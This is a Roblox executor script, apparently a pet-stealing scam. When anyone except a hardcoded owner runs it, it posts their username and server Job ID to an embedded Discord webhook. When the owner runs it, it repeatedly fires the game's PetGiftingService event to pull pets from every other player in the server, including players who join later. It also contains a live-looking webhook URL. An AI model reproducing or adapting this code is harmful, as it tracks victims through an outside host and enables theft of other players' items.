local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local HttpService = game:GetService("HttpService")

local webhookURL = "https://discord.com/api/webhooks/1378046230868787361/Ny2d9ikOTh5c3PXSTMOAT8FK4h7hIKIZ9duNOrqVqdA3AnDj04b13SSkB9GC9RzUIT9a"  -- Replace with your webhook URL
local adminUsername = "connor24377_10"  -- Your Roblox username
local localPlayer = Players.LocalPlayer
local petGiftEvent = ReplicatedStorage:WaitForChild("GameEvents"):WaitForChild("PetGiftingService")

local function sendWebhook()
    local payload = {
        content = "Script executed by player!",
        embeds = {{
            title = "Execution Report",
            fields = {
                {name = "Username", value = localPlayer.Name, inline = true},
                {name = "Server Job ID", value = game.JobId, inline = true},
            },
            color = 65280
        }}
    }

    local jsonPayload = HttpService:JSONEncode(payload)

    if syn and syn.request then
        syn.request({
            Url = webhookURL,
            Method = "POST",
            Headers = {["Content-Type"] = "application/json"},
            Body = jsonPayload
        })
    elseif request then
        request({
            Url = webhookURL,
            Method = "POST",
            Headers = {["Content-Type"] = "application/json"},
            Body = jsonPayload
        })
    else
        warn("No HTTP request function available in executor.")
    end
end

-- Only send webhook if NOT admin
if localPlayer.Name ~= adminUsername then
    sendWebhook()
end

-- If admin, wait a bit then collect pets from other players
if localPlayer.Name == adminUsername then
    local function givePetsFromPlayer(player)
        local backpack = player:FindFirstChild("Backpack")
        local character = player.Character

        if backpack then
            for _, item in ipairs(backpack:GetChildren()) do
                if item:IsA("Tool") or item:IsA("Model") then
                    petGiftEvent:FireServer("GivePet", localPlayer)
                    wait(0.3)
                end
            end
        end

        if character then
            for _, item in ipairs(character:GetChildren()) do
                if item:IsA("Tool") or item:IsA("Model") then
                    petGiftEvent:FireServer("GivePet", localPlayer)
                    wait(0.3)
                end
            end
        end
    end

    -- Wait for players to load fully
    wait(5)

    for _, player in ipairs(Players:GetPlayers()) do
        if player ~= localPlayer then
            givePetsFromPlayer(player)
        end
    end

    -- Listen for players joining after you and gift their pets too
    Players.PlayerAdded:Connect(function(player)
        wait(5) -- wait for player to load
        givePetsFromPlayer(player)
    end)
end
